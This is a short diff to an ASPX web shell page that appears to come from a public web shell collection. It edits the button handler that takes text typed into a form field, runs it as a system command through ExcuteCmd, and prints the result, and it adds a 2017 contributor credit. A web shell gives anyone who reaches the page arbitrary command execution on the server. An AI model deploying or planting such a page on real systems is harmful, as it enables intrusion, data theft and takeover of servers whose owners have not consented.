@@ -20,8 +20,8 @@ return s;
 }
 void cmdExe_Click(object sender, System.EventArgs e)
 {
-Response.Write("<pre>");
-Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
+Response.Write("<br><br><h1>output:</h1><pre>");
+Response.Write(System.Net.WebUtility.HtmlEncode(ExcuteCmd(txtArg.Text)));
 Response.Write("</pre>");
 }
 </script>
@@ -39,3 +39,4 @@ Response.Write("</pre>");
 </HTML>
 <!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
 <!--    http://michaeldaw.org   04/2007    -->
+<!--    fruh                    11/2017    -->
